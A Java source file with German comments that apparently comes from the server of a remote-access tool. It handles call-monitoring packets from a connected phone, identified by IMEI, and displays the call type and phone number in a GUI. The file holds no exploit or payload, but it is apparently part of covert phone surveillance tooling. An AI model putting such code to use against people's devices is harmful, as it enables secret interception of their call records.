package handler;

import gui.GUI;
import server.Server;
import Packet.CallStatusPacket;
import Packet.Packet;
import Packet.RawPacket;

/**
 * Diese Klasse verarbeitet die CallMonitor-Pakete.
 */
public class CallMonitorHandler implements PacketHandler {
	/**
	 * gui	Die Benutzeroberfläche
	 */
	private GUI gui;
	/**
	 * channel	Der Datenkanal
	 */
	private int channel;
	/**
	 * imei	Die IMEI des verbunden Geräts
	 */
	private String imei;

	/**
	 * Der Konstruktor der Klasse weist die übergebenen Variablen den Klassenvaribalen zu.
	 * @param channel	Der Datenkanal
	 * @param imei	Die IMEI des Geräts
	 * @param gui	Die GUI
	 */
	public CallMonitorHandler(int channel, String imei, GUI gui) {
		this.gui = gui;
		this.channel = channel;
		this.imei = imei;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
		
	}

	/**
	 * Diese Methode erhält das Paket. Daraufhin wird eine Lognachricht erzeugt.
	 * Im Anschluss wird der Listener für den Datenkanal entfernt und die GUI mit den Daten des Geräts upgedatet.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Call monitoring data has been received");
		c.getChannelHandlerMap().get(imei).getStorage(channel).reset();
		CallStatusPacket packet = (CallStatusPacket) p;
		gui.addMonitoredCall(imei, packet.getType(), packet.getPhonenumber());
	}

}
